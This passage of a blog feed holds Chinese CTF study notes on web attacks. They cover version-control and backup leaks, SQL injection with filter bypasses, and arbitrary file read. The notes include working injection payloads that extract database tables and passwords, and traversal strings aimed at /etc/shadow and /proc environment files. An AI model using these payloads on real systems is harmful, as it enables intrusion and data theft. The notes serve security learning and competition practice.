    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>0 to 1 the road of CTFer 第一章 Web入门</title>
    <link href="https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer_1/"/>
    <id>https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer_1/</id>
    <published>2021-04-26T05:49:07.000Z</published>
    <updated>2021-04-28T07:48:32.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-Web入门"><a href="#第一章-Web入门" class="headerlink" title="第一章 Web入门"></a>第一章 Web入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><h4 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a>git泄漏</h4><ol><li>常规git泄漏：flag在源码内，可直接利用工具或脚本获取。</li><li>git回滚：flag被修改，但依然保存在commit记录里。<ul><li>利用<code>git reset --hard [版本号]</code>获取flag。</li><li>更简单的方法是通过<code>git log-stat</code>查看每个commit修改了哪些文件，再用<code>git diff HEAD [commit-id]</code>比较当前版本和想看的commit之间的变化。</li></ul></li><li>git分支：命令<code>git reflog</code>查看分支间切换的记录。从原url下载分支内容并恢复（目前的恢复分支记录需要下载分支HEAD并修改GitHacker.py代码实现自动恢复分支，先简单记录下来，后续看是否有其它更简单的方式。）</li><li>git stash：stash是对当前工作的“保存”，以备后续恢复。<code>git stash list</code>查看保存的列表，<code>git stash pop</code>恢复工作现场，<code>git stash show</code>显示做了哪些改动。</li><li>git index：index是暂存区，用于通过git add .命令暂存新建文件等待commit。使用<code>git checkout-index</code>命令恢复文件。</li><li>git泄漏的其他利用方式：泄漏的git中也可能有其他有用的信息。<ul><li>.git/config文件夹中可能含有access_token信息，从而访问该用户的其它仓库。</li></ul></li></ol><h4 id="SVN泄漏"><a href="#SVN泄漏" class="headerlink" title="SVN泄漏"></a>SVN泄漏</h4><p>SVN是源代码版本管理软件，如果存在泄漏，可以利用.svn/entries或wc.db文件获取服务器源码等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li><li>Seay-svn（Win）</li></ul><h4 id="HG泄漏"><a href="#HG泄漏" class="headerlink" title="HG泄漏"></a>HG泄漏</h4><p>.hg隐藏文件中包含代码和分支修改记录等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>CTF线上赛往往会有重定向的问题，例如，只要访问<code>.git</code>便会返回403,此时访问<code>.git/config</code>，如果有文件内容返回，说明存在git泄漏，反之，一般不存在。而在SVN泄漏中，一般是在entries中爬取源代码，但有时会出现entries为空的情况，这时注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</p><h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h4><p>在Linux下，用gedit编辑器保存文件后，当前目录下会生成一个<code>[文件名]~</code>的备份文件，访问这个文件即可获得文件内容。</p><h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>vim在意外退出时会生成一个备份文件，文件名格式为<code>.filename.swp</code>，再次生成备份文件时则为<code>.filename.swo</code>，第三次为<code>.filename.swn</code>，以此类推。恢复备份的办法是，先在当前目录下创建一个flag文件，再使用<code>vim-r flag</code>，即可恢复.flag.swp。</p><h4 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h4><p>主要靠丰富字典。(dirsearch+自己收集字典)</p><ul><li>phpinfo()</li><li>备份文件后缀<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">back.rar</span><br><span class="line">back.tar</span><br><span class="line">back.tar.gz</span><br><span class="line">back.zip</span><br><span class="line">backup.rar</span><br><span class="line">backup.tar</span><br><span class="line">backup.tar.gz</span><br><span class="line">backup.zip</span><br><span class="line">temp.rar</span><br><span class="line">temp.tar</span><br><span class="line">temp.tar.gz</span><br><span class="line">temp.zip</span><br><span class="line">web.rar</span><br><span class="line">web.tar</span><br><span class="line">web.tar.gz</span><br><span class="line">web.zip</span><br><span class="line">website.rar</span><br><span class="line">website.tar</span><br><span class="line">website.tar.gz</span><br><span class="line">website.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar</span><br><span class="line">www.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">wwwroot.rar</span><br><span class="line">wwwroot.tar</span><br><span class="line">wwwroot.tar.gz</span><br><span class="line">wwwroot.zip</span><br><span class="line">index.php.bak</span><br></pre></td></tr></table></figure></li></ul><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>线上赛过程中，出题人往往会在线运维题目，有时会导致swp备份文件的生成。所以读者在比赛过程中可以编写实时监控脚本，对题目服务进行监控。</p><h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>在线上赛中，网站的Banner对解题有着十分重要的作用，选手往往可以通过Banner信息来获得解题思路。<br>如得知网站是用ThinkPHP的Web框架编写时，我们可以尝试ThinkPHP框架的相关历史漏洞。或者得知这个网站是Windows服务器，那么我们在测试上传漏洞时可以根据Windows的特性进行尝试。</p><h4 id="自行收集指纹库"><a href="#自行收集指纹库" class="headerlink" title="自行收集指纹库"></a>自行收集指纹库</h4><ul><li>Github CMS指纹库</li><li>扫描器识别</li></ul><h4 id="使用已有工具"><a href="#使用已有工具" class="headerlink" title="使用已有工具"></a>使用已有工具</h4><ul><li>Wappalyzer（pip install python-Wappalyzer）：在data目录下，apps.json是其规则库，读者可以根据自己需求自由添加。</li></ul><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>除了以上两种识别方式，我们还可以通过随意输入一些URL，观察404和302跳转页面中是否包含CMS及版本号。</p><h2 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h2><h3 id="SQL注入（mysql）"><a href="#SQL注入（mysql）" class="headerlink" title="SQL注入（mysql）"></a>SQL注入（mysql）</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>test.php?id=2 -&gt; true。返回记录。<br>test.php?id=3-1 -&gt; true，返回id=2的记录。<br>说明mysql对3-1进行了计算，从数字运算这个特征可以判断该注入点为数字型注入，输入点$_GET[‘id’]附近没有引号包裹，可以直接输入SQL查询语句。</p><p>mysql查询出两行记录（union select联合查询注入）但PHP源码限制只能显示一行记录的办法：<br>    1. 在原有数据后面加上<code>limit 1,1</code>参数，显示查询结果的第二条记录。<br>    1. 指定id=-1或一个很大的值，使第一条数据无法被查询到。（常用）</p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>与数字型注入相比，只是在GET参数输入的地方包裹了单引号（少部分情况为双引号）让其变成字符串。<br>在MySQL中，等号两边如果类型不一致则会发生强制转换，当数字和字符串数据比较时，字符串将被转换为数字再进行比较。<br>test.php?id=3-2，无返回结果，证明注入点不是数字型。继续尝试test.php?id=2a，返回id=2的结果，证明存在字符型注入。</p><pre><code>1. 尝试使用单引号闭合前面的单引号，（插入查询语句），再用`--%20`或`%23`注释后面的语句，注意在URL框输入时，`-- `和`#`以及`&#39;&#39;`要进行URL编码。1. 除了注释，也可以使用单引号来闭合后面的单引号，eg: test.php?id=2&#39;union select xxx &#39;</code></pre><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>test.php?id=1’and’f’=’a’，猜中则返回id=1内容<br>更快的方法为 test.php?id=1’and’f’&lt;’n’，二分法。<br>如何获取每一位字符？利用mysql的substring(),mid(),substr()等。</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>php?id=1’or sleep(10)</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>mysql会将语句执行后的报错信息输出。<br>updatexml在执行时，第二个参数应该为合法的XPATH路径，否则会在引发报错时输出传入的参数。<br>id=’1’ or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)<br>updatexml()报错注入，ref: <a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>当目标开启多语句执行时，可以采用多语句执行的方式修改数据库结构和数据。</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="注入点在select-expr"><a href="#注入点在select-expr" class="headerlink" title="注入点在select_expr"></a>注入点在select_expr</h4><p>AS别名：id=(select%20pwd%20from%20wp_user)%20as%20title</p><h4 id="注入点在table-reference"><a href="#注入点在table-reference" class="headerlink" title="注入点在table_reference"></a>注入点在table_reference</h4><p>仍可以用别名取出数据：SELECT title FROM (SELECT pwd AS title FROM wp_user)x;</p><p>在该两处的注入，如果注入点有反引号包裹，那么需要先闭合反引号。</p><h4 id="注入点在WHERE或HAVING后"><a href="#注入点在WHERE或HAVING后" class="headerlink" title="注入点在WHERE或HAVING后"></a>注入点在WHERE或HAVING后</h4><p>代码：<code>$res = mysqli_query($conn, &quot;SELECT title FROM wp_news WHERE id = $&#123;_GET[id]&#125;&quot;);</code><br>现实中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。</p><p>注入点在HAVING后的情况与之类似。</p><h4 id="注入点在GROUP-BY或ORDER-BY后"><a href="#注入点在GROUP-BY或ORDER-BY后" class="headerlink" title="注入点在GROUP BY或ORDER BY后"></a>注入点在GROUP BY或ORDER BY后</h4><p>当遇到不是WHERE后的注入点时，先在本地MySQL中进行尝试，看语句后面能加什么，从而判断当前可以注入的位置，进而进行有针对的注入。</p><p>假设代码如下：<code>$res = mysqli_query($conn, &quot;SELECT title FROM wp_news GROUP BY $&#123;_GET[&#39;title&#39;]&#125;&quot;);</code><br>测试可得，title=id desc,(if(1,sleep(1),1))，可以利用时间注入获取数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">事实上只要对输入值进行白名单比对，基本就能防御这种注入。</span><br></pre></td></tr></table></figure><h4 id="注入点在LIMIT后"><a href="#注入点在LIMIT后" class="headerlink" title="注入点在LIMIT后"></a>注入点在LIMIT后</h4><p>该注入比较简单，通过更改数字大小，页面会显示更多或更少的记录数。由于语法限制，LIMIT后只能是数字，在整个SQL语句没有ORDER BY关键字的情况下，可以直接使用UNION注入。另外可以根据SELECT语法，通过加入PROCEDURE来尝试注入（只适用于MySQL 5.6前的版本）</p><h3 id="INSERT注入"><a href="#INSERT注入" class="headerlink" title="INSERT注入"></a>INSERT注入</h3><p>通常注入位于字段名或字段值的地方，且没有回显信息。</p><h4 id="注入点位于tbl-name"><a href="#注入点位于tbl-name" class="headerlink" title="注入点位于tbl_name"></a>注入点位于tbl_name</h4><p>如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。</p><h4 id="注入点位于VALUES"><a href="#注入点位于VALUES" class="headerlink" title="注入点位于VALUES"></a>注入点位于VALUES</h4><h3 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h3><h3 id="DELETE注入"><a href="#DELETE注入" class="headerlink" title="DELETE注入"></a>DELETE注入</h3><p>对id参数进行注入时，如果使WHERE后的值变为true，数据就会被删除。为了保证正常数据不会被干扰，通常使用<code>and sleep (1)</code>保证WHERE后的结果返回为false，让语句无法成功执行，后续步骤参考时间盲注。</p><h2 id="注入防御及绕过思路"><a href="#注入防御及绕过思路" class="headerlink" title="注入防御及绕过思路"></a>注入防御及绕过思路</h2><p>其它ref：<a href="https://blog.csdn.net/wy_97/article/details/78085664">https://blog.csdn.net/wy_97/article/details/78085664</a></p><h3 id="关键字替换或匹配拦截"><a href="#关键字替换或匹配拦截" class="headerlink" title="关键字替换或匹配拦截"></a>关键字替换或匹配拦截</h3><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>替代空格的空白符有：<code>%0a, %0b, %0c, %0d, %09, %a0</code>（均为URL编码，%a0在特定字符集才能利用）和<code>/**/</code>组合、括号等。</p><h4 id="将SELECT替换成空"><a href="#将SELECT替换成空" class="headerlink" title="将SELECT替换成空"></a>将SELECT替换成空</h4><p>可以采用嵌套的方式，如SESELECTLECT。</p><h4 id="大小写匹配"><a href="#大小写匹配" class="headerlink" title="大小写匹配"></a>大小写匹配</h4><p>在MySQL中，关键字是不区分大小写的，如果只匹配了SELECT就可以通过大小写混写的方式绕过。</p><h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>正则匹配关键字<code>\bselect\b</code>可以用形如<code>/*!50000select*/</code>的方式绕过。</p><h4 id="替换了单引号或双引号，没有过滤反斜杠"><a href="#替换了单引号或双引号，没有过滤反斜杠" class="headerlink" title="替换了单引号或双引号，没有过滤反斜杠"></a>替换了单引号或双引号，没有过滤反斜杠</h4><p><code>id=&#39;a\&#39; AND title = &#39;OR sleep(1)#&#39;</code><br>反斜杠转义了预置的单引号，实现绕过。</p><h3 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h3><h4 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h4><p>当用户输入待转义函数时，如果数据处于编码状态则引号无法被转义。<br>同样的情况也发生在加密/解密、字符集转换的情况。</p><ul><li>宽字节注入</li></ul><h4 id="意料之外的输入点"><a href="#意料之外的输入点" class="headerlink" title="意料之外的输入点"></a>意料之外的输入点</h4><p>被遗漏的可控点，例如PHP中，上传的文件名、http header、$_SERVER[‘PHP_SELF’] 等变量。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>由于开发者信任数据库中取出的数据是无害的，从而导致二次注入漏洞的出现。</p><ul><li> 用户名为<code>admin&#39;or&#39;1</code></li></ul><h4 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h4><p>在标题、抬头等位置，开发者可能限制其字符不能超过x个字符，超过就会被截断。<br>假如攻击者输入<code>aaaa&#39;</code>，自动转义为<code>aaaa\&#39;</code>，由于长度限制被截取为<code>aaaa\</code>，正好转义预置的单引号，实现注入。</p><h3 id="注入应用"><a href="#注入应用" class="headerlink" title="注入应用"></a>注入应用</h3><ul><li>在有写文件权限的情况下，直接用INTO OUTFILE或DUMPFILE向Web目录写文件，或写文件后结合文件包含漏洞实现代码执行。ref:<a href="https://baijiahao.baidu.com/s?id=1650711425682220792&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1650711425682220792&amp;wfr=spider&amp;for=pc</a></li><li>在有读文件权限的情况下，用load_file()函数读取网站源码和配置信息，获取敏感数据。</li><li>提升权限，绕过登录，添加用户，调整用户权限。</li><li>通过数据，控制如缓存、模板等文件内容来获取权限，或者删除、读取某些关键文件。</li><li>在可以执行多语句的情况下，控制整个数据库，包括控制任意数据、任意字段长度等。</li><li>在SQL Server这类数据库中可以直接执行系统命令。</li></ul><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>实际比赛中，应根据不同的SQL服务器类型查找相关资料，通过fuzz得出被过滤的字符、函数、关键词等，在文档中查找未过滤的替代，完成绕过。</p><ul><li>练习靶场：github-sqli-labs</li></ul><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><h3 id="文件读取漏洞常见触发点"><a href="#文件读取漏洞常见触发点" class="headerlink" title="文件读取漏洞常见触发点"></a>文件读取漏洞常见触发点</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>有关文件读取的标准函数（审计中重点关注）。<br>包括但不限于：</p><ul><li><code>file_get_contents(),file(),fopen()</code>函数，(及其文件指针操作函数fread(),fgets()等);</li><li>与文件包含相关的函数<code>include(),require(),include_once(),require_once()</code>等;</li><li>通过PHP读文件的执行系统命令：<code>system(),exec()</code>等。<br>PHP扩展中读取文件的函数：</li><li>php-curl扩展</li><li>XML模块XXE</li></ul><p>相关源码阅读：Wrapper和Filter</p><p>PHP文件包含的实际问题：<br>    1. 文件路径前面可控，后面不可控：在较低PHP及容器版本中可以使用<code>\x00</code>截断，对应的URL编码是<code>%00</code>。当服务端存在文件上传功能时，也可以尝试利用zip或phar协议直接进行文件包含执行PHP代码。<br>    1. 文件路径后面可控，前面不可控：通过<code>../</code>进行目录穿越读取文件，但这种情况无法使用Wrapper，如果服务器是利用include等文件包含类的函数，将无法读取PHP文件中的PHP代码。<br>    1. 文件路径中间可控：和第一种相似，但无法利用Wrapper进行文件包含。</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数。但直接导致漏洞的原因往往是Python函数的feature被忽略。</p><p>除了Python框架，很多其它涉及文件操作的应用也可能因为滥用open函数、模板的不当渲染导致任意文件读取。</p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><ul><li>文件读取函数FileInputStream</li><li>XXE</li><li>JAVA模块所支持的<code>file://</code>协议</li><li>Spring Cloud Config Server 路径穿越与任意文件读取漏洞 CVE-2019-3799, Jenkins 任意文件读取漏洞 CVE-2018-1999002</li></ul><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><ul><li>通常与Rails框架相关。</li><li>Ruby on Rails 远程代码执行漏洞 CVE-2016-0752，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2018-3760，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2019-5418</li></ul><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><ul><li>通常为模板注入、代码注入等。</li><li>Node.js express 模块任意文件读取漏洞 CVE-2017-14849</li></ul><h3 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><p>常搭配Python-Web应用一起出现。</p><ul><li>/static../ -&gt; /home/myapp/static/../，产生目录穿越，穿越至myapp目录。原因：location最后没有加‘/’限制<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static &#123;</span><br><span class="line">  alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>MySQL：</p><ul><li>load_file(),利用条件严格，但仍然常出相关文件读取题目。</li><li>load data infile，需要执行完整的SQL语句且需要FILE权限，比较少见，除了SSRF攻击MySQL以外，很少能够直接执行整条非基本SQL语句的机会。</li></ul><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>又称符号链接，即soft link或symbolic link。相当于win下的快捷方式。</p><p>硬链接与软链接的区别： <a href="https://www.jianshu.com/p/b035d94fa959">https://www.jianshu.com/p/b035d94fa959</a></p><p>bash命令<code>ln-s</code>可以创建一个指向指定文件的软链接文件，然后将该文件上传至服务器，访问该链接文件时，实际上是在请求服务端它指向的文件。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><p>CISCN 2017 FFmpeg 任意文件读取漏洞</p><h4 id="Doker-API"><a href="#Doker-API" class="headerlink" title="Doker-API"></a>Doker-API</h4><p>Docker-API可以控制Docker的行为，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。当可以通过SSRF漏洞进行UNIX Socket通信时，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作）。</p><h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><p>客户端文件读取漏洞，大多基于XSS读取本地文件。</p><h4 id="浏览器-Flash-XSS"><a href="#浏览器-Flash-XSS" class="headerlink" title="浏览器/Flash XSS"></a>浏览器/Flash XSS</h4><p>js读取本地文件</p><ul><li>Safari浏览器 客户端本地文件读取漏洞</li></ul><h4 id="MarkDown语法解析器XSS"><a href="#MarkDown语法解析器XSS" class="headerlink" title="MarkDown语法解析器XSS"></a>MarkDown语法解析器XSS</h4><p>具有解析js的能力，且缺乏浏览器的读取本地文件限制。</p><h2 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="flag名称（相对路径）"><a href="#flag名称（相对路径）" class="headerlink" title="flag名称（相对路径）"></a>flag名称（相对路径）</h4><p>fuzz方式获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">[dir_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;root&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;[user_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br></pre></td></tr></table></figure><h4 id="服务器信息（绝对路径）"><a href="#服务器信息（绝对路径）" class="headerlink" title="服务器信息（绝对路径）"></a>服务器信息（绝对路径）</h4><p>CTF中常见的部分须知目录和文件</p><ol><li>/etc目录<br> 多是各种应用或系统配置文件，是进行文件读取的首要目标。</li><li>/etc/passwd （详细解析：<a href="http://c.biancheng.net/view/839.html%EF%BC%89">http://c.biancheng.net/view/839.html）</a><br> Linux系统保存用户信息及其工作目录的文件，所有用户/组可读，一般用作Linux系统下文件读取漏洞存在判断的基准。从该文件可得系统中存在哪些用户，及其所属组和工作目录。</li><li>/etc/shadow （详细解析： <a href="http://c.biancheng.net/view/840.html%EF%BC%89">http://c.biancheng.net/view/840.html）</a><br> 是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下该文件不可读。</li><li>/etc/apache2/*<br> 是Apache的配置文件，可以获知Web目录、服务端口等信息。</li><li>/etc/nginx/*<br> 是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>/etc/apparmor(.d)/*<br> 是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。（如查看MySQL是否禁用系统调用，确定是否可以使用UDF执行系统命令）</li><li>/etc/(cron.d/*|crontab)<br> 是定时任务文件。有些题会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其它文件。</li><li>/etc/environment<br> 是环境变量配置文件之一。环境变量可能存在大量目录信息的泄漏，甚至可能出现secret key泄漏的情况。</li><li>/etc/hostname<br> 主机名</li><li>/etc/hosts<br> 主机名查询静态表，包含知道域名解析IP的成对信息。通过该文件，可以探测网卡信息和内网IP/域名。</li><li>/etc/issue<br> 指明系统版本。</li><li>/etc/mysql/*<br> MySQL配置文件。</li><li>/etc/php/*<br> PHP配置文件。</li><li>/proc目录<br> 通常存储进程动态运行的各种信息，本质上是一种虚拟目录。<br> <em>如果查看非当前进程的信息，pid是可以暴力破解的，如果要查看当前进程，只需/proc/self/代替/proc/[pid]/即可。</em><br> 对应目录下的cmdline可读出比较敏感的信息。<code>/proc/[pid]/cmdline</code><br> 有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录。<code>/proc/[pid]/cwd/</code><br> 环境变量中可能存在secret_key，也可以通过environ读取。<code>/proc/[pid]/environ</code></li><li>其它目录</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-Web入门&quot;&gt;&lt;a href=&quot;#第一章-Web入门&quot; class=&quot;headerlink&quot; title=&quot;第一章 Web入门&quot;&gt;&lt;/a&gt;第一章 Web入门&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="119 Notes" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"/>
    
    
    <category term="Notes" scheme="https://tsunamori.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>CTF SQLI</title>
    <link href="https://tsunamori.github.io/wiki/CTF_SQLI/"/>
    <id>https://tsunamori.github.io/wiki/CTF_SQLI/</id>
    <published>2021-04-25T09:12:07.000Z</published>
    <updated>2021-04-27T08:20:02.028Z</updated>
    
    <content type="html"><![CDATA[<h3 id="手注流程"><a href="#手注流程" class="headerlink" title="手注流程"></a>手注流程</h3><ol><li><p>页面里有一个POST表单，测试会不会有注入漏洞<br> POST里<br> id=1’和id=1’#<br> id=1’ and 1=2#和id=1’ and 1=1#<br> 前一个不回显后一个回显，那么说明存在注入。</p></li><li><p>判断字段数：有四个字段<br> id=1’ order by 4#</p></li><li><p>判断回显位：<br> id=1’ union select 1,2,3,4# 有正常回显<br> id=1’ union select 1,2,3# 无回显，证明该数据库在第四位，查询该数据库名</p></li><li><p>id=0’ union select 1,2,3,database()# 查到表名为skctf，继续查数据表（tables）名</p></li><li><p>id=0’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=’skctf’#</p></li><li><p>id=0’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p></li><li><p>查询数据：<br> id=0’ union select 1,2,3,skctf_flag from fl4g#<br> 得到flag。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;手注流程&quot;&gt;&lt;a href=&quot;#手注流程&quot; class=&quot;headerlink&quot; title=&quot;手注流程&quot;&gt;&lt;/a&gt;手注流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;页面里有一个POST表单，测试会不会有注入漏洞&lt;br&gt; POST里&lt;br&gt; id=1’和id=1’#&lt;br</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF MD5</title>
    <link href="https://tsunamori.github.io/wiki/CTF_MD5/"/>
    <id>https://tsunamori.github.io/wiki/CTF_MD5/</id>
    <published>2021-04-25T02:30:06.000Z</published>
    <updated>2021-05-10T02:00:23.559Z</updated>
    
